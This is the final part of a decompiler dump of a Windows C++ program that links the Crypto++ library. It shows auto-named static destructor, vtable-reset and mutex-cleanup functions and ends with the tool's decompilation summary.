//----- (00465F6F) --------------------------------------------------------
void __thiscall sub_465F6F(void *Block)
{
  j___free_base(Block);
}

//----- (0046604A) --------------------------------------------------------
_DWORD *__cdecl sub_46604A(_DWORD *a1)
{
  int v1; // ecx
  _DWORD *result; // eax

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_493098,
          (int (__stdcall *)(void *, void *, void **))sub_4659EE,
          &unk_4930A0) )
    terminate(v1);
  result = a1;
  *a1 = 0;
  a1[1] = 0;
  _InterlockedIncrement(&dword_4930A4);
  *a1 = &unk_4930AC;
  a1[1] = &unk_4930A0;
  return result;
}
// 4660C4: variable 'v1' is possibly undefined
// 44E1AF: using guessed type void __thiscall __noreturn terminate(_DWORD);
// 4930A4: using guessed type int dword_4930A4;

//----- (004660CA) --------------------------------------------------------
_DWORD *__cdecl sub_4660CA(_DWORD *a1)
{
  int v1; // ecx
  _DWORD *result; // eax

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_49302C,
          (int (__stdcall *)(void *, void *, void **))sub_465A5E,
          &unk_493030) )
    terminate(v1);
  result = a1;
  *a1 = 0;
  a1[1] = 0;
  _InterlockedIncrement(&dword_493034);
  *a1 = &unk_49303C;
  a1[1] = &unk_493030;
  return result;
}
// 466144: variable 'v1' is possibly undefined
// 44E1AF: using guessed type void __thiscall __noreturn terminate(_DWORD);
// 493034: using guessed type int dword_493034;

//----- (0046614A) --------------------------------------------------------
int __stdcall sub_46614A(int a1)
{
  return 0;
}

//----- (00469E32) --------------------------------------------------------
void __cdecl sub_469E32()
{
  unknown_libname_5(&lpMultiByteStr);
  unknown_libname_3(&lpWideCharStr);
  unknown_libname_3(&unk_48CCD4);
  sub_401CF5(&dword_48CCC8);
}
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);

//----- (00469E42) --------------------------------------------------------
void __cdecl sub_469E42()
{
  off_48CD4C = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48CD4C: using guessed type int (__thiscall **off_48CD4C)(void *Block, char);

//----- (00469E4D) --------------------------------------------------------
void __cdecl sub_469E4D()
{
  unknown_libname_5(&unk_48CD34);
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);

//----- (00469E57) --------------------------------------------------------
void __cdecl sub_469E57()
{
  unknown_libname_5(&unk_48CD1C);
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);

//----- (00469E61) --------------------------------------------------------
void __cdecl sub_469E61()
{
  _Mtx_destroy_in_situ((_Mtx_t)&unk_493138);
}

//----- (00469E6D) --------------------------------------------------------
void __cdecl sub_469E6D()
{
  if ( Src )
  {
    std::_Deallocate<8,0>(Src, (dword_493134 - (_DWORD)Src) & 0xFFFFFFF8);
    Src = 0;
    dword_493130 = 0;
    dword_493134 = 0;
  }
}
// 493134: using guessed type int dword_493134;

//----- (00469E9C) --------------------------------------------------------
void __cdecl sub_469E9C()
{
  off_48CD80 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48CD80: using guessed type int (__thiscall **off_48CD80)(void *Block, char);

//----- (00469EA7) --------------------------------------------------------
void __cdecl sub_469EA7()
{
  unknown_libname_5(&unk_48CD68);
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);

//----- (00469EB1) --------------------------------------------------------
void __cdecl sub_469EB1()
{
  unknown_libname_5(&unk_48CD50);
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);

//----- (00469EBB) --------------------------------------------------------
void __cdecl sub_469EBB()
{
  _Mtx_destroy_in_situ((_Mtx_t)&unk_49319C);
}

//----- (00469EC7) --------------------------------------------------------
void __cdecl sub_469EC7()
{
  sub_40BAFC(dword_48C004, 1, 0);
}
// 48C004: using guessed type _DWORD dword_48C004[6];

//----- (00469ED6) --------------------------------------------------------
void __cdecl sub_469ED6()
{
  off_48C000 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C000: using guessed type int (__thiscall **off_48C000)(void *Block, char);

//----- (00469EE1) --------------------------------------------------------
void __cdecl sub_469EE1()
{
  sub_40BAFC(dword_48C024, 1, 0);
}
// 48C024: using guessed type _DWORD dword_48C024[6];

//----- (00469EF0) --------------------------------------------------------
void __cdecl sub_469EF0()
{
  off_48C020 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C020: using guessed type int (__thiscall **off_48C020)(void *Block, char);

//----- (00469EFB) --------------------------------------------------------
void __cdecl sub_469EFB()
{
  sub_40BAFC(dword_48C040, 1, 0);
}
// 48C040: using guessed type _DWORD dword_48C040[6];

//----- (00469F0B) --------------------------------------------------------
void __cdecl sub_469F0B()
{
  off_48C03C = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C03C: using guessed type int (__thiscall **off_48C03C)(void *Block, char);

//----- (00469F17) --------------------------------------------------------
void __cdecl sub_469F17()
{
  sub_40BAFC(dword_48C074, 1, 0);
}
// 48C074: using guessed type _DWORD dword_48C074[6];

//----- (00469F26) --------------------------------------------------------
void __cdecl sub_469F26()
{
  off_48C070 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C070: using guessed type int (__thiscall **off_48C070)(void *Block, char);

//----- (00469F31) --------------------------------------------------------
void __cdecl sub_469F31()
{
  if ( dword_490CD8 )
    (**(void (__thiscall ***)(int, int))dword_490CD8)(dword_490CD8, 1);
  dword_490CD8 = 0;
}
// 490CD8: using guessed type int dword_490CD8;

//----- (00469F49) --------------------------------------------------------
void __cdecl sub_469F49()
{
  if ( dword_490CD0 )
    (**(void (__thiscall ***)(int, int))dword_490CD0)(dword_490CD0, 1);
  dword_490CD0 = 0;
}
// 490CD0: using guessed type int dword_490CD0;

//----- (00469F61) --------------------------------------------------------
void __cdecl sub_469F61()
{
  sub_40BAFC(dword_48C090, 1, 0);
}
// 48C090: using guessed type _DWORD dword_48C090[6];

//----- (00469F70) --------------------------------------------------------
void __cdecl sub_469F70()
{
  off_48C08C = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C08C: using guessed type int (__thiscall **off_48C08C)(void *Block, char);

//----- (00469F7B) --------------------------------------------------------
void __cdecl sub_469F7B()
{
  sub_40BAFC(dword_48C0C4, 1, 0);
}
// 48C0C4: using guessed type _DWORD dword_48C0C4[6];

//----- (00469F8A) --------------------------------------------------------
void __cdecl sub_469F8A()
{
  sub_40BAFC(dword_48C0AC, 1, 0);
}
// 48C0AC: using guessed type _DWORD dword_48C0AC[6];

//----- (00469F99) --------------------------------------------------------
void __cdecl sub_469F99()
{
  off_48C0A8 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C0A8: using guessed type int (__thiscall **off_48C0A8)(void *Block, char);

//----- (00469FA4) --------------------------------------------------------
void __cdecl sub_469FA4()
{
  sub_40BAFC(dword_48C0E0, 1, 0);
}
// 48C0E0: using guessed type _DWORD dword_48C0E0[6];

//----- (00469FB3) --------------------------------------------------------
void __cdecl sub_469FB3()
{
  off_48C0DC = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C0DC: using guessed type int (__thiscall **off_48C0DC)(void *Block, char);

//----- (00469FBE) --------------------------------------------------------
void __cdecl sub_469FBE()
{
  void *v0; // esi

  v0 = (void *)dword_490CE0;
  if ( dword_490CE0 )
  {
    sub_41F004((HCRYPTPROV *)dword_490CE0);
    sub_42CF7C(v0);
  }
  dword_490CE0 = 0;
}
// 490CE0: using guessed type int dword_490CE0;

//----- (00469FC8) --------------------------------------------------------
void __cdecl sub_469FC8()
{
  sub_40BAFC(dword_48C0FC, 1, 0);
}
// 48C0FC: using guessed type _DWORD dword_48C0FC[6];

//----- (00469FD7) --------------------------------------------------------
void __cdecl sub_469FD7()
{
  off_48C0F8 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C0F8: using guessed type int (__thiscall **off_48C0F8)(void *Block, char);

//----- (00469FE2) --------------------------------------------------------
void __cdecl sub_469FE2()
{
  sub_40BAFC(dword_48C11C, 1, 0);
}
// 48C11C: using guessed type _DWORD dword_48C11C[6];

//----- (00469FF1) --------------------------------------------------------
void __cdecl sub_469FF1()
{
  off_48C118 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C118: using guessed type int (__thiscall **off_48C118)(void *Block, char);

//----- (00469FFC) --------------------------------------------------------
void __cdecl sub_469FFC()
{
  sub_40BAFC(dword_48C150, 1, 0);
}
// 48C150: using guessed type _DWORD dword_48C150[6];

//----- (0046A00B) --------------------------------------------------------
void __cdecl sub_46A00B()
{
  sub_40BAFC(dword_48C138, 1, 0);
}
// 48C138: using guessed type _DWORD dword_48C138[6];

//----- (0046A01A) --------------------------------------------------------
void __cdecl sub_46A01A()
{
  off_48C134 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C134: using guessed type int (__thiscall **off_48C134)(void *Block, char);

//----- (0046A025) --------------------------------------------------------
void __cdecl sub_46A025()
{
  sub_40BAFC(dword_48C16C, 1, 0);
}
// 48C16C: using guessed type _DWORD dword_48C16C[6];

//----- (0046A034) --------------------------------------------------------
void __cdecl sub_46A034()
{
  off_48C168 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C168: using guessed type int (__thiscall **off_48C168)(void *Block, char);

//----- (0046A03F) --------------------------------------------------------
void __cdecl sub_46A03F()
{
  sub_40BAFC(dword_48C18C, 1, 0);
}
// 48C18C: using guessed type _DWORD dword_48C18C[6];

//----- (0046A04E) --------------------------------------------------------
void __cdecl sub_46A04E()
{
  off_48C188 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C188: using guessed type int (__thiscall **off_48C188)(void *Block, char);

//----- (0046A059) --------------------------------------------------------
void __cdecl sub_46A059()
{
  sub_40BAFC(dword_48C1A8, 1, 0);
}
// 48C1A8: using guessed type _DWORD dword_48C1A8[6];

//----- (0046A068) --------------------------------------------------------
void __cdecl sub_46A068()
{
  off_48C1A4 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C1A4: using guessed type int (__thiscall **off_48C1A4)(void *Block, char);

//----- (0046A073) --------------------------------------------------------
void __cdecl sub_46A073()
{
  sub_40BAFC(dword_48C1E0, 1, 0);
}
// 48C1E0: using guessed type _DWORD dword_48C1E0[6];

//----- (0046A082) --------------------------------------------------------
void __cdecl sub_46A082()
{
  sub_40BAFC(dword_48C1C8, 1, 0);
}
// 48C1C8: using guessed type _DWORD dword_48C1C8[6];

//----- (0046A091) --------------------------------------------------------
void __cdecl sub_46A091()
{
  off_48C1C4 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C1C4: using guessed type int (__thiscall **off_48C1C4)(void *Block, char);

//----- (0046A09C) --------------------------------------------------------
void __cdecl sub_46A09C()
{
  sub_40BAFC(dword_48C218, 1, 0);
}
// 48C218: using guessed type _DWORD dword_48C218[6];

//----- (0046A0AB) --------------------------------------------------------
void __cdecl sub_46A0AB()
{
  sub_40BAFC(dword_48C200, 1, 0);
}
// 48C200: using guessed type _DWORD dword_48C200[6];

//----- (0046A0BA) --------------------------------------------------------
void __cdecl sub_46A0BA()
{
  off_48C1FC = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C1FC: using guessed type int (__thiscall **off_48C1FC)(void *Block, char);

//----- (0046A0C5) --------------------------------------------------------
void __cdecl sub_46A0C5()
{
  sub_40BAFC(dword_48C238, 1, 0);
}
// 48C238: using guessed type _DWORD dword_48C238[6];

//----- (0046A0D4) --------------------------------------------------------
void __cdecl sub_46A0D4()
{
  off_48C234 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C234: using guessed type int (__thiscall **off_48C234)(void *Block, char);

//----- (0046A0DF) --------------------------------------------------------
void __cdecl sub_46A0DF()
{
  sub_40BAFC(dword_48C254, 1, 0);
}
// 48C254: using guessed type _DWORD dword_48C254[6];

//----- (0046A0EE) --------------------------------------------------------
void __cdecl sub_46A0EE()
{
  off_48C250 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C250: using guessed type int (__thiscall **off_48C250)(void *Block, char);

//----- (0046A0F9) --------------------------------------------------------
void __cdecl sub_46A0F9()
{
  sub_40BAFC(dword_48C274, 1, 0);
}
// 48C274: using guessed type _DWORD dword_48C274[6];

//----- (0046A108) --------------------------------------------------------
void __cdecl sub_46A108()
{
  off_48C270 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C270: using guessed type int (__thiscall **off_48C270)(void *Block, char);

//----- (0046A113) --------------------------------------------------------
void __cdecl sub_46A113()
{
  sub_40BAFC(dword_48C290, 1, 0);
}
// 48C290: using guessed type _DWORD dword_48C290[6];

//----- (0046A122) --------------------------------------------------------
void __cdecl sub_46A122()
{
  off_48C28C = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C28C: using guessed type int (__thiscall **off_48C28C)(void *Block, char);

//----- (0046A12D) --------------------------------------------------------
void __cdecl sub_46A12D()
{
  sub_40BAFC(dword_48C2AC, 1, 0);
}
// 48C2AC: using guessed type _DWORD dword_48C2AC[6];

//----- (0046A13C) --------------------------------------------------------
void __cdecl sub_46A13C()
{
  off_48C2A8 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C2A8: using guessed type int (__thiscall **off_48C2A8)(void *Block, char);

//----- (0046A147) --------------------------------------------------------
void __cdecl sub_46A147()
{
  sub_40BAFC(dword_48C2C8, 1, 0);
}
// 48C2C8: using guessed type _DWORD dword_48C2C8[6];

//----- (0046A156) --------------------------------------------------------
void __cdecl sub_46A156()
{
  off_48C2C4 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C2C4: using guessed type int (__thiscall **off_48C2C4)(void *Block, char);

//----- (0046A161) --------------------------------------------------------
void __cdecl sub_46A161()
{
  sub_40BAFC(dword_48C2E4, 1, 0);
}
// 48C2E4: using guessed type _DWORD dword_48C2E4[6];

//----- (0046A170) --------------------------------------------------------
void __cdecl sub_46A170()
{
  off_48C2E0 = (int (__thiscall **)(void *, char))&CryptoPP::NameValuePairs::`vftable';
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 48C2E0: using guessed type int (__thiscall **off_48C2E0)(void *Block, char);

//----- (0046A17B) --------------------------------------------------------
void __cdecl sub_46A17B()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(&dword_48C2FC, 0xFFFFFFFF) < 0 )
  {
    v0 = &stru_491D38;
    do
      _Mtxdst(v0++);
    while ( v0 != (struct _RTL_CRITICAL_SECTION *)&unk_491DF8 );
  }
}
// 48C2FC: using guessed type int dword_48C2FC;

//----- (0046A185) --------------------------------------------------------
void __cdecl sub_46A185()
{
  sub_4050C4(byte_491E10);
}

//----- (0046A18F) --------------------------------------------------------
void __cdecl sub_46A18F()
{
  sub_404A8D((int)&dword_491E60);
}
// 491E60: using guessed type int dword_491E60;

//----- (0046A199) --------------------------------------------------------
void __cdecl sub_46A199()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(&dword_48C2FC, 0xFFFFFFFF) < 0 )
  {
    v0 = &stru_491D38;
    do
      _Mtxdst(v0++);
    while ( v0 != (struct _RTL_CRITICAL_SECTION *)&unk_491DF8 );
  }
}
// 48C2FC: using guessed type int dword_48C2FC;

//----- (0046A1A3) --------------------------------------------------------
void __cdecl sub_46A1A3()
{
  std::_Fac_tidy_reg_t::~_Fac_tidy_reg_t((std::_Fac_tidy_reg_t *)&unk_46ECD0);
}

//----- (0046A1AD) --------------------------------------------------------
void __cdecl sub_46A1AD()
{
  sub_4032B2(&dword_491ED4);
}
// 491ED4: using guessed type _DWORD dword_491ED4;

//----- (0046A1B7) --------------------------------------------------------
void __cdecl sub_46A1B7()
{
  sub_429F5E((char *)dword_491F48);
}
// 491F48: using guessed type int dword_491F48[15];

//----- (0046A1C1) --------------------------------------------------------
void __cdecl sub_46A1C1()
{
  sub_404A8D((int)&dword_491EF0);
}
// 491EF0: using guessed type int dword_491EF0;

//----- (0046A1CB) --------------------------------------------------------
void __cdecl sub_46A1CB()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(&dword_48C2FC, 0xFFFFFFFF) < 0 )
  {
    v0 = &stru_491D38;
    do
      _Mtxdst(v0++);
    while ( v0 != (struct _RTL_CRITICAL_SECTION *)&unk_491DF8 );
  }
}
// 48C2FC: using guessed type int dword_48C2FC;

//----- (0046A1D5) --------------------------------------------------------
void __cdecl sub_46A1D5()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(&dword_48C2FC, 0xFFFFFFFF) < 0 )
  {
    v0 = &stru_491D38;
    do
      _Mtxdst(v0++);
    while ( v0 != (struct _RTL_CRITICAL_SECTION *)&unk_491DF8 );
  }
}
// 48C2FC: using guessed type int dword_48C2FC;

//----- (0046A1DF) --------------------------------------------------------
void __cdecl sub_46A1DF()
{
  sub_42A2DA(byte_491FB0);
}

//----- (0046A1E9) --------------------------------------------------------
void __cdecl sub_46A1E9()
{
  sub_42A221(dword_492000);
}
// 492000: using guessed type int dword_492000[14];

//----- (0046A1F3) --------------------------------------------------------
void __cdecl sub_46A1F3()
{
  _Init_atexit::~_Init_atexit((_Init_atexit *)&unk_492301);
}

//----- (0046A1FD) --------------------------------------------------------
void __cdecl sub_46A1FD()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(&dword_48C2FC, 0xFFFFFFFF) < 0 )
  {
    v0 = &stru_491D38;
    do
      _Mtxdst(v0++);
    while ( v0 != (struct _RTL_CRITICAL_SECTION *)&unk_491DF8 );
  }
}
// 48C2FC: using guessed type int dword_48C2FC;

//----- (0046A207) --------------------------------------------------------
void __cdecl sub_46A207()
{
  DeleteCriticalSection((LPCRITICAL_SECTION)((char *)&unk_4923BC + 20));
  if ( *((_DWORD *)&unk_4923BC + 11) )
  {
    j___free_base(*((void **)&unk_4923BC + 11));
    *((_DWORD *)&unk_4923BC + 11) = 0;
  }
  *((_DWORD *)&unk_4923BC + 12) = 0;
  *((_DWORD *)&unk_4923BC + 13) = 0;
}
// 46A207: could not find valid save-restore pair for esi

//----- (0046A211) --------------------------------------------------------
void __cdecl sub_46A211()
{
  void *v0; // esi

  v0 = dword_49279C;
  if ( dword_49279C )
  {
    sub_42FC40((char *)dword_49279C);
    sub_42CF7C(v0);
    dword_49279C = 0;
  }
}

// nfuncs=3650 queued=2478 decompiled=2478 lumina nreq=0 worse=0 better=0
#error "There were 4 decompilation failure(s) on 2478 function(s)"
